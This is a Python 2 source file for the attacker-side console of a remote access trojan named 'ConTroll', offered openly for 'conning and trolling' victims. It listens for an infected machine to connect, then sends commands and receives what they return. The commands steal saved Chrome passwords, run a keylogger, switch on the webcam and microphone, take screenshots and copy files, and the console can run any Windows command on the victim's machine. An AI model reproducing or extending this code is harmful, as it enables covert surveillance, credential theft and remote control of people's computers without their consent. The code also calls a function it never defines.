import socket, os, time
import cv2, numpy
 
ip_address = '192.168.10.16'

banner ="""                                                  
   (                    *   )               (    (   
   )\                 ` )  /(   (           )\   )\  
 (((_)    (     (      ( )(_))  )(     (   ((_) ((_) 
 )\___    )\    )\ )  (_(_())  (()\    )\   _    _   
((/ __|  ((_)  _(_/(  |_   _|   ((_)  ((_) | |  | |  
 | (__  / _ \ | ' \))   | |    | '_| / _ \ | |  | |  
  \___| \___/ |_||_|    |_|    |_|   \___/ |_|  |_|

(C) Start Conning and Trolling TODAY!!

FiRsT TiMe? TyPe \'CoN-mE\' fOr HeLp
"""

def functions():
    print '\nNB: When connected to victim, you can run any windows commands remotely\neg. shutdown'
    print '\n----------------------------------------------------------'
    print '\t\tConTroll Options'
    print '----------------------------------------------------------'
    print 'start-trolling  --> Wait for a victim to be hooked'
    print 'stop-trolling   --> Disconnect from victim'
    print '----------------------------------------------------------'
    print '\nUse these added Commands to Con/Troll the Victim\n'
    print 'about           --> Get information about victim\'s machine'
    print 'activateWebcam  --> Active Victim\'s webcam'
    print 'activateMic     --> Active Victim\'s microphone'
    print 'chromeDump      --> Steal saved passwords stored in chrome'
    print 'getLogFile      --> Get Keylogger file with logged keys'
    print 'getRecording    --> Retrieve microphone recording from victim'
    print 'grab <arg>      --> Grab a file from the victim\'s machine'
    print 'kill            --> Kill any process running on victim\'s machine'
    print 'lockScreen      --> Lock Victim\'s screen'
    print 'openDrive       --> Open\'s victim CD drive'
    print 'screencap       --> Get a screen shot of the victim\'s desktop'
    print 'startLogger     --> Start keylogger'
    print 'speak--<text>   --> Victim\'s machine talks with custom text passed'
    print 'stopLogger      --> Stop keylogger'
    print '\ntroll--<Troll message>--<buttonCode+iconCode>--<Popup title>--<# of popus> -->   Troll victim with pop ups\n'
    print """button Codes                  -                 Icon Codes
0: Normal message box                   16: Critical message icon
1: OK and Cancel                        32: Warning query icon
2: Abort, Retry, Ignore                 48: Warning message icon 
3: Yes, No, Cancel                      64: Information message icon
4: Yes and No	                        4096: Always on top of the desktop
5: Retry and Cancel
    """
                                                 
def webCam(connection, command):
    connection.send(command)
    while True:
        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip_address, 9900)) #bind on all interface to port 9900
        soc.listen(1) #listen for one connection
        conn, addr = soc.accept() #accept connection
        
        message = [] #variable to hold the data
        while True:
            d = conn.recv(1024 * 1024) #receive this much data
            if not d: break
            message.append(d)
        data = ''.join(message) #assemble the entire data
        numpy_data = numpy.fromstring(data, numpy.uint8) #convert to its original format
         
        decimg = cv2.imdecode(numpy_data, 1) #read image from memory buffer(numpy_data)
        cv2.imshow("Remote WebCam", decimg) #display image
         
        if cv2.waitKey(5) == 27: break #close if user presses 'ESC'
         
    cv2.destroyAllWindows()

def transfer(conn,command):
    conn.send(command)
    f = open('test.png','wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed '
            f.close()
            break
        elif bits.endswith('captured'):
            print '[+] Transferring Screen Shot of Victim...'
            time.sleep(2)
            print '\n[+] Transfer completed '
            f.close()
            break
        elif bits.endswith('LogSent'):
            print '[+] Transferring KeyLog File...'
            time.sleep(2)
            print '\n[+] Transfer completed '
            f.close()
            break
        elif bits.endswith('DumpSent'):
            print '[+] Transferring Chrome Login Data File...'
            time.sleep(2)
            print '\n[+] Transfer completed '
            f.close()
            break
        f.write(bits)
        
def transferChromeDump(conn,command):
    conn.send(command)
    f = open('ChromeLoginData.txt','wb')
    while True:  
        bits = conn.recv(1024)
        if 'Chrome Doesn\'t exists' in bits:
            print '[-] Chrome Doesn\'t exists'
            break
        elif bits.endswith('DumpSent'):
            print '[+] Transferring Chrome Login Data File...'
            time.sleep(2)
            print '\n[+] Transfer completed '
            f.close()
            break
        f.write(bits)

def recordMic(conn,command):
    conn.send(command)
    f = open('audio.wav','wb')
    while True:  
        bits = conn.recv(1024)
        if bits.endswith('recordingSent'):
            print '[+] Transferring Recoreded Audio...'
            time.sleep(2)
            print '\n[+] Transfer completed '
            f.close()
            break
        f.write(bits)

def snapshot(conn,command):
    conn.send(command)
    f = open('snapshot.png','wb')
    while True:  
        bits = conn.recv(1024)
        if bits.endswith('snapSent'):
            print '\n[+] Snap Taken '
            f.close()
            break
        f.write(bits)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip_address, 8080))
    s.listen(1)
    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept()
    print '[+] We got a connection from: ', addr

    while True:
        command = raw_input("Shell> ")
        if 'stop-trolling' in command:
            conn.send('terminate')
            conn.close()
            return 1
        elif 'grab' in command: 
            transfer(conn,command)
        elif 'screencap' in command:
            transfer(conn, command)
        elif 'getLogFile' in command:
             transfer(conn, command)
        elif 'CoN-mE' in command:
             functions()
        elif 'getWebcam' in command:
             transfer(conn, command)
        elif 'activateWebcam' in command:
            webCam(conn, command)
        elif 'getRecording' in command:
             recordMic(conn, command)
        elif 'chromeDump' in command:
            transferChromeDump(conn, command)
        elif 'send' in command:
            image = command.split(' ')
            transferImage(conn, image[1], command)
        elif 'snapshot' in command:
            snapshot(conn, command)
        elif 'cls' in command:
            os.system('cls')
            print banner
            print '[+] Listening for incoming TCP connection on port 8080'
            print '[+] We got a connection from: ', addr
        elif 'troll' in command:
            try:
                call, msg, icons, title, times = command.split('--')
                conn.send(command) 
            except:
                print 'Usage troll--<Troll message>--<buttonCode+iconCode>--<Popup title>--<# of popus>\neg. troll--"You\'ve been p0wned"--0+16+4096--"trolled"--120\ntype \'CoN-mE\' for more information'
        else:
            conn.send(command) 
            print conn.recv(1024) 
        
def main ():
    os.system('cls')
    print banner
    while True:
        cmd = raw_input('> ')
        if cmd == 'CoN-mE':
            functions()
        elif cmd == 'start-trolling':
            if connect() == 1:
                os.system('cls')
                print banner
                print 'Hope You Had Fun!'
                break
        else:
            main()

if __name__ == "__main__":
    main()
